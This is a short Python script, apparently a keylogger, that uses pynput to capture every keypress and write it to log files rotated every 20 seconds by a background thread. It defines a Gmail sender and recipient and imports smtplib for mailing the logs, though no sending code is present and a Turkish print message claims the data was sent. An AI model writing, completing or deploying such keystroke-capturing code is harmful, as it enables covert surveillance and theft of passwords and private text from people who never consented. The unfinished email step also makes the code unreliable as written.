from pynput.keyboard import Listener
import _thread
import os
import time
import smtplib
sender = 'cmpbilge@gmail.com'
receivers = ['cmpbilge@gmail.com']
outp=open("log.txt","w")
def sendoutp():
    counter=1
    print("Threade gir ")
    global outp
    while True:
        outp.close()
        outp=open("log"+str(counter)+".txt","w")
        time.sleep(20)
        print("Attım sisteme")
        counter+=1
def on_press(key):
    print("Key : ",str(key),file=outp)
with Listener(on_press=on_press) as listener:
    _thread.start_new(sendoutp,())
    listener.join()
